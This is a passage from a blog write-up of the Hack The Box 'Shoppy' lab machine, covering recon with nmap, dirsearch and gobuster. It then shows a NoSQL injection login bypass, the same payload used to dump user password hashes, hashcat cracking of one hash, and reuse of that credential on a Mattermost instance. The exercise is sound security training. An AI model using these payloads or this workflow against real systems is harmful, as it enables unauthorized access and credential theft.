<!DOCTYPE html>
<html><head>
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Shoppy From Hack The Box - Easy Linux Machine - gokupwn | Blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="Shoppy HTB machine writeup" />
	<meta property="og:image" content=""/>
	<meta property="og:title" content="Shoppy From Hack The Box - Easy Linux Machine" />
<meta property="og:description" content="Shoppy HTB machine writeup" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://gokupwn.github.io/posts/shoppy-htb-machine/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-12-17T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-12-17T00:00:00+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Shoppy From Hack The Box - Easy Linux Machine"/>
<meta name="twitter:description" content="Shoppy HTB machine writeup"/>
<script src="https://gokupwn.github.io/js/feather.min.js"></script>
	
	
        <link href="https://gokupwn.github.io/css/fonts.11a1877508139eac0b5b4852ceb110c35641b3533321e66e39149e901ed5756b.css" rel="stylesheet">
	

	
	<link rel="stylesheet" type="text/css" media="screen" href="https://gokupwn.github.io/css/main.dcdce5d0c876e01eff6576e36e0eaf7dac6d2941cbe7cd1770b52e1288fd3212.css" />
		<link id="darkModeStyle" rel="stylesheet" type="text/css" href="https://gokupwn.github.io/css/dark.19b9457bc32f3649f4646b44ab3d6445ba73f43a15cd0763d01e18bc77eb5bbf.css"  disabled />
	
	
	
</head>
<body>
        <div class="content"><header>
	<div class="main">
		<a href="https://gokupwn.github.io/">gokupwn | Blog</a>
	</div>
	<nav>
		
		<a href="/">Home</a>
		
		<a href="/posts">All posts</a>
		
		<a href="/about">About</a>
		
		<a href="/tags">Tags</a>
		
		| <span id="dark-mode-toggle" onclick="toggleTheme()"></span>
		<script src="https://gokupwn.github.io/js/themetoggle.js"></script>
		
	</nav>
</header>

<main>
	<article>
		<div class="title">
			<h1 class="title">Shoppy From Hack The Box - Easy Linux Machine</h1>
			<div class="meta">Posted on Dec 17, 2022</div>
		</div>
		
		<div class="tldr">
			<strong>tl;dr:</strong>
			Exploiting NoSQL injection to bypass the login page and gain access to Josh&#39;s credentials. Using Josh&#39;s credentials, we were able to access the internal chat web app, where we were able to obtain Jeager&#39;s leaked credentials and gain access to the machine. A weak password manager C&#43;&#43; application was used to gain access to a Docker container with the user deploy. Once we were inside the Docker container, we were able to escape from it to gain access as the root user.
		</div>

		<section class="body">
			<h1 id="recon">Recon:</h1>
<h2 id="nmap-scan">Nmap Scan:</h2>
<h3 id="quick-nmap-scan">Quick Nmap Scan:</h3>
<ul>
<li>Open Ports: 80 (http) - 22 (ssh)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>goku@exploitation:~$  export IP<span style="color:#f92672">=</span>10.10.11.180
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ nmap $IP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-16 04:23 CET
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.180
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.026s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">998</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp open  ssh
</span></span><span style="display:flex;"><span>80/tcp open  http
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.56 seconds
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$
</span></span></code></pre></div><h3 id="nmap-full-scan">Nmap Full Scan:</h3>
<ul>
<li>Open Ports: 80 (http) - 22 (ssh) - 9093 (copycat)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>goku@exploitation:~$ nmap -p- $IP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-16 04:25 CET
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.180
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.023s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65532</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
</span></span><span style="display:flex;"><span>22/tcp   open  ssh
</span></span><span style="display:flex;"><span>80/tcp   open  http
</span></span><span style="display:flex;"><span>9093/tcp open  copycat
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 14.11 seconds
</span></span></code></pre></div><h3 id="nmap-services-version-fingerprinting">Nmap Services Version Fingerprinting:</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>goku@exploitation:~$ nmap -p80,22,9093  -sV -sC $IP
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-12-16 04:28 CET
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.180
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.027s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PORT     STATE SERVICE  VERSION
</span></span><span style="display:flex;"><span>22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey:
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 9e5e8351d99f89ea471a12eb81f922c0 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 5857eeeb0650037c8463d7a3415b1ad5 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 3e9d0a4290443860b3b62ce9bd9a6754 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp   open  http     nginx 1.23.1
</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://shoppy.htb
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.23.1
</span></span><span style="display:flex;"><span>9093/tcp open  copycat?
</span></span><span style="display:flex;"><span>| fingerprint-strings:
</span></span><span style="display:flex;"><span>|   GenericLines:
</span></span><span style="display:flex;"><span>|     HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Connection: close
</span></span><span style="display:flex;"><span>|     Request
</span></span><span style="display:flex;"><span>|   GetRequest, HTTPOptions:
</span></span><span style="display:flex;"><span>|     HTTP/1.0 <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>|     Content-Type: text/plain; version<span style="color:#f92672">=</span>0.0.4; charset<span style="color:#f92672">=</span>utf-8
</span></span><span style="display:flex;"><span>|     Date: Fri, <span style="color:#ae81ff">16</span> Dec <span style="color:#ae81ff">2022</span> 03:28:51 GMT
</span></span><span style="display:flex;"><span>|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
</span></span><span style="display:flex;"><span>|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
</span></span><span style="display:flex;"><span>|     go_gc_cycles_automatic_gc_cycles_total <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
</span></span><span style="display:flex;"><span>|     TYPE go_gc_cycles_forced_gc_cycles_total counter
</span></span><span style="display:flex;"><span>|     go_gc_cycles_forced_gc_cycles_total <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
</span></span><span style="display:flex;"><span>|     TYPE go_gc_cycles_total_gc_cycles_total counter
</span></span><span style="display:flex;"><span>|     go_gc_cycles_total_gc_cycles_total <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
</span></span><span style="display:flex;"><span>|     TYPE go_gc_duration_seconds summary
</span></span><span style="display:flex;"><span>|     go_gc_duration_seconds<span style="color:#f92672">{</span>quantile<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span><span style="color:#f92672">}</span> 4.1317e-05
</span></span><span style="display:flex;"><span>|     go_gc_duration_seconds<span style="color:#f92672">{</span>quantile<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.25&#34;</span><span style="color:#f92672">}</span> 5.2989e-05
</span></span><span style="display:flex;"><span>|_    go_gc_d
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style="display:flex;"><span>.....
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 101.34 seconds
</span></span></code></pre></div><ul>
<li>Let&rsquo;s add <code>shoppy.htb</code> to our <code>/etc/hosts</code> file:
Pasted-image-</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@exploitation:/home/goku<span style="color:#ae81ff">\#</span> echo <span style="color:#e6db74">&#34;10.10.11.180 shoppy.htb&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h2 id="recon-web-application---port-80-http">Recon: Web application - Port 80 (http)</h2>
<ul>
<li>Main page:</li>
</ul>
<p><img src="/Pasted-image-20221216043623.png" alt="Image alt"></p>
<ul>
<li>Web Tech Stack:</li>
</ul>
<p><img src="/Pasted-image-20221216043700.png" alt="Image alt"></p>
<ul>
<li>After examining the web application, i have not find anything useful.</li>
<li>So i decided to start directory brute force. I will use diresearch with the default world list for that:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>goku@exploitation:~$ dirsearch -u http://shoppy.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  _|. _ _  _  _  _ _|_    v0.4.2
</span></span><span style="display:flex;"><span> <span style="color:#f92672">(</span>_<span style="color:#f92672">||</span>| _<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>/_<span style="color:#f92672">(</span>_<span style="color:#f92672">||</span> <span style="color:#f92672">(</span>_| <span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span style="color:#ae81ff">30</span> | Wordlist size: <span style="color:#ae81ff">10927</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Output File: /home/goku/.dirsearch/reports/shoppy.htb/_22-12-16_04-52-35.txt
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Error Log: /home/goku/.dirsearch/logs/errors-22-12-16_04-52-35.log
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Target: http://shoppy.htb/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:52:35<span style="color:#f92672">]</span> Starting:
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:52:36<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  171B  - /js  -&gt;  /js/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:52:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -   28B  - /ADMIN  -&gt;  /login
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:52:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -   28B  - /Admin  -&gt;  /login
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:52:59<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -   28B  - /admin  -&gt;  /login
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:53:00<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -   28B  - /admin/  -&gt;  /login
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:53:00<span style="color:#f92672">]</span> <span style="color:#ae81ff">302</span> -   28B  - /admin/?/login  -&gt;  /login
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:53:17<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  179B  - /assets  -&gt;  /assets/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:53:28<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  173B  - /css  -&gt;  /css/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:53:37<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  177B  - /fonts  -&gt;  /fonts/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:53:38<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -  208KB - /favicon.ico
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:53:41<span style="color:#f92672">]</span> <span style="color:#ae81ff">301</span> -  179B  - /images  -&gt;  /images/
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:53:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    1KB - /login
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>04:53:48<span style="color:#f92672">]</span> <span style="color:#ae81ff">200</span> -    1KB - /login/
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Task Completed
</span></span></code></pre></div><ul>
<li>Intersting!, new endpoint: <code>/login</code></li>
<li><code>/login</code> page:</li>
</ul>
<p><img src="/Pasted-image-20221216045759.png" alt="Image alt"></p>
<p><img src="/Pasted-image-20221216045741.png" alt="Image alt"></p>
<ul>
<li>Let&rsquo;s intecept a login request with burpsuite:</li>
</ul>
<p><img src="/Pasted-image-20221216052142.png" alt="Image alt"></p>
<ul>
<li>I tested the login page for SQL injections but it does not work. I tried to run sqlmap against the <code>/login</code> endpoint but it does not work too.</li>
<li>The recon phase does not reveal any database information (if it&rsquo;s SQL or NoSQL database)</li>
<li>After testing for SQL and failed to get a good result, i will test for NOSQL injection.
<ul>
<li>After a lot of googling to learn more about NOSQL injection (I don&rsquo;t know to much about it)</li>
<li>The following payloaf worked with me to bypass the login page: <code>admin'||'1==1//</code></li>
</ul>
</li>
</ul>
<p><img src="/Pasted-image-20221216054404.png" alt="Image alt"></p>
<ul>
<li>Login page bypassed:</li>
</ul>
<p><img src="/Pasted-image-20221216054535.png" alt="Image alt"></p>
<ul>
<li>I tried to search for <code>test</code> and i get the following result:</li>
</ul>
<p><img src="/Pasted-image-20221216054732.png" alt="Image alt"></p>
<ul>
<li>What is interstiing here is the query parameter name <code>username</code></li>
<li>I tried to submit a search query now but with value <code>admin</code> for the query parameter <code>username=</code></li>
<li>I get the following result:</li>
</ul>
<p><img src="/Pasted-image-20221216054957.png" alt="Image alt"></p>
<ul>
<li>I clicked download and here is what i get!:</li>
</ul>
<p><img src="/Pasted-image-20221216055056.png" alt="Image alt"></p>
<ul>
<li>We have now the admin password in a hashed format, we can try to crack it and see if we can get a foothold to the machine.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Get the hashed password and save it inside a bash variable</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># hashedPassword</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ hashedPassword<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl  http://shoppy.htb/exports/export-search.json | jq <span style="color:#e6db74">&#39;.[0].password&#39;</span> | sed <span style="color:#e6db74">&#39;s/\&#34;//g&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Using the hashid tool we can identify the possible hashtype</span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ hashid $hashedPassword
</span></span><span style="display:flex;"><span>Analyzing <span style="color:#e6db74">&#39;23c6877d9e2b564ef8b32c3a23de27b2&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MD2
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MD5
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> MD4
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Double MD5
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> LM
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RIPEMD-128
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Haval-128
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Tiger-128
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Skein-256<span style="color:#f92672">(</span>128<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Skein-512<span style="color:#f92672">(</span>128<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Lotus Notes/Domino <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Skype
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Snefru-128
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> NTLM
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Cached Credentials
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Cached Credentials <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> DNSSEC<span style="color:#f92672">(</span>NSEC3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> RAdmin v2.x
</span></span></code></pre></div><ul>
<li>After that i tested the username paramter, and i found that this parameter is vulnerable to NoSQL injection and i used the same payload as previous to get all the users fron the database. <code>http://shoppy.htb/admin/search-users?username=test%27||%271=1//</code>\</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>goku@exploitation:~$ hashedPasswords<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl  http://shoppy.htb/exports/export-search.json | jq <span style="color:#e6db74">&#39;.[].password&#39;</span> | sed <span style="color:#e6db74">&#39;s/\&#34;//g&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ cat $hashedPasswords
</span></span><span style="display:flex;"><span>23c6877d9e2b564ef8b32c3a23de27b2
</span></span><span style="display:flex;"><span>6ebcea65320589ca4f2f1ce039975995
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ userAndPass<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>curl  http://shoppy.htb/exports/export-search.json | jq <span style="color:#e6db74">&#39;.[] | &#34;\(.username):\(.password)&#34;&#39;</span> | sed <span style="color:#e6db74">&#39;s/\&#34;//g&#39;</span><span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ echo $userAndPass
</span></span><span style="display:flex;"><span>admin:23c6877d9e2b564ef8b32c3a23de27b2
</span></span><span style="display:flex;"><span>josh:6ebcea65320589ca4f2f1ce039975995
</span></span></code></pre></div><ul>
<li>Crack the hash:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>oku@exploitation:~$ echo $hashedPasswords &gt; hash_to_crack.txt
</span></span><span style="display:flex;"><span>goku@exploitation:~$ cat hash_to_crack.txt
</span></span><span style="display:flex;"><span>23c6877d9e2b564ef8b32c3a23de27b2
</span></span><span style="display:flex;"><span>6ebcea65320589ca4f2f1ce039975995
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Start hashcat</span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ hashcat -m <span style="color:#ae81ff">0</span> -a <span style="color:#ae81ff">0</span> -o cracked_hash.txt hash_to_crack.txt  /usr/share/wordlists/rockyou.txt
</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The hash for the &#34;josh&#34; user was cracked</span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ cat cracked_hash.txt
</span></span><span style="display:flex;"><span>6ebcea65320589ca4f2f1ce039975995:remembermethisway
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ echo $userAndPass &gt; userAndPassComb.txt
</span></span><span style="display:flex;"><span>goku@exploitation:~$ diff userAndPassComb.txt cracked_hash.txt
</span></span><span style="display:flex;"><span>1,2c1
</span></span><span style="display:flex;"><span>&lt; admin:23c6877d9e2b564ef8b32c3a23de27b2
</span></span><span style="display:flex;"><span>&lt; josh:6ebcea65320589ca4f2f1ce039975995
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>&gt; 6ebcea65320589ca4f2f1ce039975995:remembermethisway
</span></span><span style="display:flex;"><span>goku@exploitation:~$
</span></span></code></pre></div><ul>
<li>Credentials:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># username=&#34;josh&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># password=&#34;remembermethisway&#34;</span>
</span></span></code></pre></div><ul>
<li>Faild to login wiuth ssh as <code>josh</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># try to ssh into the box</span>
</span></span><span style="display:flex;"><span>goku@exploitation:~$ ssh josh@10.10.11.180
</span></span><span style="display:flex;"><span>The authenticity of host <span style="color:#e6db74">&#39;10.10.11.180 (10.10.11.180)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ED25519 key fingerprint is SHA256:RISsnnLs1eloK7XlOTr2TwStHh2R8hui07wd1iFyB+8.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">This key is not known by any other names
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Warning: Permanently added &#39;</span>10.10.11.180<span style="color:#e6db74">&#39; (ED25519) to the list of known hosts.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">josh@10.10.11.180&#39;</span>s password:
</span></span><span style="display:flex;"><span>Permission denied, please try again.
</span></span><span style="display:flex;"><span>josh@10.10.11.180<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
</span></span></code></pre></div><h2 id="recon-return-back---enumerate-virtual-host">Recon: Return Back - Enumerate Virtual Host</h2>
<ul>
<li>I will use <code>gobuster</code> to perform the virtual hosts enumeration and i will use <code>seclists</code> as a world list:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>goku@exploitation:~$ gobuster vhost -u shoppy.htb -t <span style="color:#ae81ff">40</span> -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --append-domain
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Gobuster v3.3
</span></span><span style="display:flex;"><span>by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@firefart<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:             http://shoppy.htb
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Method:          GET
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:         <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:        /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:      gobuster/3.3
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:         10s
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Append Domain:   true
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2022/12/17 00:56:13 Starting gobuster in VHOST enumeration mode
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>Found: mattermost.shoppy.htb Status: <span style="color:#ae81ff">200</span> <span style="color:#f92672">[</span>Size: 3122<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Progress: <span style="color:#ae81ff">99683</span> / <span style="color:#ae81ff">100001</span> <span style="color:#f92672">(</span>99.68%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span><span style="display:flex;"><span>2022/12/17 00:57:09 Finished
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============================================================</span>
</span></span></code></pre></div><ul>
<li>We found a valid subdomain <code>mattermost.shoppy.htb</code></li>
</ul>
<h2 id="recon-web-application-mattermostshoppyhtb">Recon: Web application <code>mattermost.shoppy.htb</code></h2>
<ul>
<li>
<p>Main Page:
<img src="/Pasted-image-20221217010830.png" alt="Image alt"></p>
</li>
<li>
<p>What is Mattermost?</p>
<blockquote>
<p>Mattermost is an open-source, self-hosted team communication platform that combines the functionality of a chat app with the security and control of an on-premises solution. It is designed to help teams communicate and collaborate more effectively, with features such as real-time messaging, file sharing, and integration with other tools and services.</p>
</blockquote>
</li>
<li>
<p>Let&rsquo;s try to login with <code>josh:remembermethisway</code></p>
<ul>
<li>Successful</li>
</ul>
</li>
</ul>
<p><img src="/Pasted-image-20221217011122.png" alt="Image alt"></p>
<ul>
<li>Intersting finding:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span># Mesage from Josh: development group chat
</span></span><span style="display:flex;"><span>
